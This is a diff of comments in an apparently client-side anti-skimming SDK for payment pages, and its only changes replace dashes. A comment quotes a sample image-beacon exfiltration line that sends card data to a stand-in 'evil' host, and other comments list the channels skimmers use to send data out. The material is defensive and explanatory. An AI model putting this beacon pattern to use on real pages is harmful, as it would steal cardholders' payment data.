@@ -1,5 +1,5 @@
 /*!
- * Nemesis Shield — Browser SDK (client-side runtime protection for checkout / payment pages).
+ * Nemesis Shield - Browser SDK (client-side runtime protection for checkout / payment pages).
  *
  * Learns your page's normal CLIENT-SIDE behavior, then in enforce mode:
  *
@@ -9,16 +9,16 @@
  *     - Magecart / sideloaded scripts + iframes injected from un-approved origins
  *     - form-jacking: a form (esp. a payment form) re-pointed to submit to an attacker origin
  *
- *   DETECTS + ALERTS (reports a finding — PCI DSS 4.0.1 §11.6.1 tamper detection)
+ *   DETECTS + ALERTS (reports a finding - PCI DSS 4.0.1 §11.6.1 tamper detection)
  *     - inline <script> injection / change (content fingerprint not in the approved inventory)
  *     - hidden input fields injected into a payment form (overlay skimmer)
  *     - clickjacking: the page rendered inside an un-approved frame ancestor
  *
- *   INVENTORY (PCI DSS 4.0.1 §6.4.3 — authorize + integrity + inventory of every script)
+ *   INVENTORY (PCI DSS 4.0.1 §6.4.3 - authorize + integrity + inventory of every script)
  *     - every external script origin and every inline-script fingerprint is reported to the console
  *
  * Even when an inline skimmer manages to run, its stolen data cannot leave: every exfil channel to an
- * un-approved origin is blocked. A learned, per-app allow-list — like a CSP the owner curates in the
+ * un-approved origin is blocked. A learned, per-app allow-list - like a CSP the owner curates in the
  * console. Works with React, Angular, Vue, jQuery, and plain JS (shared browser primitives).
  * Fail-open (never breaks the page), privacy-preserving (origins + shapes only, never payloads),
  * first-party traffic always allowed.
@@ -210,7 +210,7 @@
           return SB(u, data);
         };
       }
-      // Image-beacon exfil: new Image().src = "//evil/?cc=..." — the classic skimmer gate.
+      // Image-beacon exfil: new Image().src = "//evil/?cc=..." - the classic skimmer gate.
       if (env.HTMLImageElement && env.HTMLImageElement.prototype) {
         try {
           var d = Object.getOwnPropertyDescriptor(env.HTMLImageElement.prototype, "src");
@@ -272,7 +272,7 @@
       } catch (e) {}
       return false;
     }
-    // Resource-bearing attributes across every tag a skimmer can exfil or code-load through — the
+    // Resource-bearing attributes across every tag a skimmer can exfil or code-load through - the
     // img-beacon written via setAttribute (bypasses the Image.src property hook), <link rel=prefetch/
     // preload>, <video>/<audio>/<source>/<track>/<embed> src, <object data>, and <a ping>. Off-baseline
     // third-party loads are neutralized in enforce mode (blanked, not removed, so layout survives).
